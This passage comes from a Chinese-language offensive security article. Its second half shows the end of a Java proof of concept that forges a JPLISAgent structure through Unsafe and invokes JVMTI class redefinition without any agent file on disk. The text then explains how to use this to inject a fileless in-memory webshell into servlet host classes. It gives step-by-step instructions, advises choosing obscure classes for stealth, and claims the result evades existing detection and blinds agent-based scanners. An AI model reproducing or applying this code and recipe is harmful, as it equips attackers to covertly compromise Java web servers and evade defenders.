                throw new AssertionError(e);
            }
            //libjvm.so的jvmti_RedefineClasses函数会校验if ( (*((_BYTE *)jvmtienv + 361) & 2) != 0 )
            unsafe.putByte(native_jvmtienv + 361, (byte) 2);
            //伪造JPLISAgent结构时，只需要填mNormalEnvironment中的mJVMTIEnv即可，其他变量代码中实际没有使用
            long JPLISAgent = unsafe.allocateMemory(0x1000);
            unsafe.putLong(JPLISAgent + 8, native_jvmtienv);
            //利用伪造的JPLISAgent结构实例化InstrumentationImpl
            try {
                Class instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
                Constructor constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
                constructor.setAccessible(true);
                Object inst = constructor.newInstance(JPLISAgent, true, false);
                ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
                Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
                redefineClazz.invoke(inst, new Object[] {
                        new ClassDefinition[] {
                                definition
                        }
                });
            }catch(Exception e) {
                e.printStackTrace();
            }
            fout.getFD();
        }
        private static final int SHT_DYNSYM = 11;
        private static final int STT_FUNC    =2;
        private static final int STT_GNU_IFUNC    =10;
        private static int ELF_ST_TYPE(int x) {
            return (x & 0xf);
        }
        static long find_symbol(String elfpath, String sym, long libbase) throws IOException {
            long func_ptr = 0;
            RandomAccessFile fin = new RandomAccessFile(elfpath, "r");
            byte[] e_ident = new byte[16];
            fin.read(e_ident);
            short e_type = Short.reverseBytes(fin.readShort());
            short e_machine = Short.reverseBytes(fin.readShort());
            int e_version = Integer.reverseBytes(fin.readInt());
            long e_entry = Long.reverseBytes(fin.readLong());
            long e_phoff = Long.reverseBytes(fin.readLong());
            long e_shoff = Long.reverseBytes(fin.readLong());
            int e_flags = Integer.reverseBytes(fin.readInt());
            short e_ehsize = Short.reverseBytes(fin.readShort());
            short e_phentsize = Short.reverseBytes(fin.readShort());
            short e_phnum = Short.reverseBytes(fin.readShort());
            short e_shentsize = Short.reverseBytes(fin.readShort());
            short e_shnum = Short.reverseBytes(fin.readShort());
            short e_shstrndx = Short.reverseBytes(fin.readShort());
            int sh_name = 0;
            int sh_type = 0;
            long sh_flags = 0;
            long sh_addr = 0;
            long sh_offset = 0;
            long sh_size = 0;
            int sh_link = 0;
            int sh_info = 0;
            long sh_addralign = 0;
            long sh_entsize = 0;
            for(int i = 0; i  0 ? symtab_shdr_sh_size/symtab_shdr_sh_entsize : 0;
            for(long i = 0; i < cnt; ++i) {
                fin.seek(symtab_shdr_sh_offset + symtab_shdr_sh_entsize*i);
                int st_name = Integer.reverseBytes(fin.readInt());
                byte st_info = fin.readByte();
                byte st_other = fin.readByte();
                short st_shndx = Short.reverseBytes(fin.readShort());
                long st_value = Long.reverseBytes(fin.readLong());
                long st_size = Long.reverseBytes(fin.readLong());
                if(st_value == 0
                        || st_name == 0
                        || (ELF_ST_TYPE(st_info) != STT_FUNC && ELF_ST_TYPE(st_info) != STT_GNU_IFUNC))
                {
                    continue;
                }
                fin.seek(symstr_shdr_sh_offset + st_name);
                String name = "";
                byte ch = 0;
                while((ch = fin.readByte()) != 0)
                {
                    name += (char)ch;
                }
                if(sym.equals(name))
                {
                    func_ptr = libbase + st_value;
                    break;
                }
            }
            fin.close();
            return func_ptr;
        }
    }
上面代码是我在游望之的Poc上做了一些修改，如果需要对Linux平台下的Java类字节码进行动态替换，只要实例化上述MemShell类，调用agentForLinux函数即可。agentForLinux函数有两个参数，第一个为需要动态修改的类名，第二个为类的新版本字节码数组。
至此，我们就在无需目标磁盘落地文件的前提下，优雅而又安静的完成了动态修改Java类的能力。为了后续讨论方便，我将这种无需提供Agent.jar或者Agent.so来直接调用JVMTI接口的能力称作AgentNoFile。
### 植入内存马
有了动态修改类字节码的能力，注入内存马就没有障碍了，流程如下：
  1. 首先选定需要植入的宿主类，比如weblogic/servlet/internal/ServletStubImpl.class，jakarta/servlet/http/HttpServlet.class,javax/servlet/http/HttpServlet.class。这三个类基本可以覆盖主流的Java web容器了。
  2. 读取宿主类的字节码；
  3. 往步骤2中的字节码中插入webshell字节码，这一步可以用asm或者Javaassit完成，当然也可以直接硬编码别人植入好的成品；
  4. 调用上文中的动态修改类的函数，传递宿主类名和修改过的类字节码数组，植入完成。
上述就是利用AgentNoFile技术植入内存马的一般步骤，当然具体选哪个宿主类可以根据环境自定义，比如选一些比较冷门但是却必现在正常执行流程中的类，这样可以更具隐蔽性。
冰蝎v4.0已集成该能力。
### 后记
通过Java AgentNoFile方式植入的内存马，整个过程中不会有文件在磁盘上落地，而且不会在JVM中新增类，甚至连方法也不会增加。它就像inline
hook一样无色无味。在目前已有的基于反射机制的内存马查杀工具面前，它是隐形的。如果配合我文中介绍的Anti-Attch机制，基于Java
Agent技术的内存马查杀工具也会直接被致盲。
另外，本文标题虽然是讲内存马的注入，实际是提供了一种打通Java到Native层的一个不受约束的通道。利用这个通道，其实能做的事情非常多。
### 参考
  1. [利用“进程注入”实现无文件复活 WebShell](https://www.freebuf.com/news/172753.html)
  2. [Java内存攻击技术漫谈](https://xz.aliyun.com/t/10075)
  3. [Linux下内存马进阶植入技术](https://mp.weixin.qq.com/s/ulINOH4BnwfR7MBc6r5YHQ)